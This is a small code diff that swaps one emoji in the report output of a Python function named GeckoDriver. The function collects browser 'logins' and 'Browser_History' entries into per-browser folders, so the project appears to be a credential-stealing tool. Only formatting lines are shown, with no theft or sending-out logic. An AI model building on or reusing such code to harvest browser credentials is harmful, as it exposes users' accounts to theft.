@@ -263,7 +263,7 @@ def GeckoDriver(data):
                     if new:
                         data.append("\n🔍"+browser_name)
                         new = False
-                    data.append("\n∟📜logins")
+                    data.append("\n∟🔑logins")
 
                 if "Browser_History" in browsers_data[browser_name]:
                     if not os.path.exists(pathtofile+'\\Browsers\\'+browser_name):
